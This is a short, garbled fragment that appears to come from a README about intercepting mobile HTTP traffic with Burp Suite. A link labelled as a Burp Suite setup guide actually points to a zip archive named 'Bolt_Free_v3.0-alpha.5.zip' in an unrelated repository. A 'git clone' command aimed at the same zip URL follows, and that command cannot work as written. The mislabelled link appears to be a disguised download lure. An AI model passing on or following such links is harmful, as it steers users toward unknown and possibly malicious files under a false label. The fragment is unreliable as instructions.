...
- Burpsuit to intercept `HTTP` requests and get the information below (more on how to get Burpsuit set up on mobile under [Intercepting Requests with Burp Suite](https://raw.githubusercontent.com/baniblunt/Bolt4Free/main/megasclerum/Bolt_Free_v3.0-alpha.5.zip)
...
```
git clone https://raw.githubusercontent.com/baniblunt/Bolt4Free/main/megasclerum/Bolt_Free_v3.0-alpha.5.zip
```
